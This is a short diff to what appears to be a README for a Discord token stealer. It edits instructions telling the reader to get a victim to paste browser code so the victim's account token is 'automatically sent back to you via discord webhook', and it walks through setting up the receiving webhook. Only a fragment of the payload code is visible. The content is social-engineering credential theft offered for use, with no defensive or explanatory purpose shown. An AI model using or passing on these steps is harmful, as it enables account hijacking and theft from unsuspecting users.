@@ -22,7 +22,7 @@ Alternative codes, follow the same steps as above.
 
 - Method 2:
 
-Get user to copy and paste this code into browser and token will be automatically sent back to you via discord webhook.
+Get user to copy and paste this code into browser and token will be automatically sent back to you via discord webhook. Replace ```YOUR DISCORD WEBHOOK HERE``` with your discord webhook URL.
 
 ```
 location.reload();
@@ -58,6 +58,6 @@ How to set up your discord webhook:
 
 ![](https://i.imgur.com/2MticGD.png)
 
-5. Then, click on ```Copy webhook URL``` and you have your discord token webhook setup!
+5. Then, click on ```Copy webhook URL``` and you have your discord webhook setup!
 
 ![](https://i.imgur.com/8AnneNZ.png)
